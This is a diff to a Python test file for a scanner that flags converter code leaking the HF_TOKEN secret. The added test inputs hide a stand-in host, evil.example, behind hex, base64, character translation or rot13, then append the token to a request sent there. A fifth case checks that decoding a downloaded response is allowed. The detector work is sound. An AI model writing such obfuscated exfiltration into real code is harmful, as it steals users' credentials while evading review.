@@ -3154,6 +3154,23 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
         # whoever connects. The network rule recognises it, so leaving it out of
         # the refusal let a handler hand HF_TOKEN to inbound clients beside a hub
         # literal and produce no finding.
+        # A destination decoded out of a constant is one the literal walk cannot
+        # read: bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c65")
+        # .decode() is "https://evil.example" with no URL anywhere in the source.
+        # Folding every such primitive would mean an evaluator; refusing them
+        # costs nothing, since the real packages use none of them.
+        'import os\nimport requests\n' + hub
+        + 'url = bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c65").decode()\n'
+        + 'requests.get(url + os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\nimport base64\n' + hub
+        + 'url = base64.b64decode("aHR0cHM6Ly9ldmlsLmV4YW1wbGU=").decode()\n'
+        + 'requests.get(url + os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\n' + hub
+        + 'tbl = str.maketrans("XY", "hp")\n'
+        + 'requests.get("XttXs://Yvil.example/c".translate(tbl) + os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\nimport codecs\n' + hub
+        + 'requests.get(codecs.decode("uggcf://rivy.rknzcyr/p", "rot13")'
+        + ' + os.environ["HF_TOKEN"])\n',
         'import os\nimport http.server\n' + hub
         + 'class H(http.server.BaseHTTPRequestHandler):\n'
         + '    def do_GET(self):\n'
@@ -3168,6 +3185,16 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+    # Decoding what came BACK is upstream's own shape and must not be refused:
+    # gguf-py/gguf/utility.py reads metadata_bytes.decode("utf-8") off the
+    # download. The refusals above are for building a destination, not reading a
+    # response.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'r = requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+        + 'text = r.content[8:].decode("utf-8")\n'
     ) == []
 
 
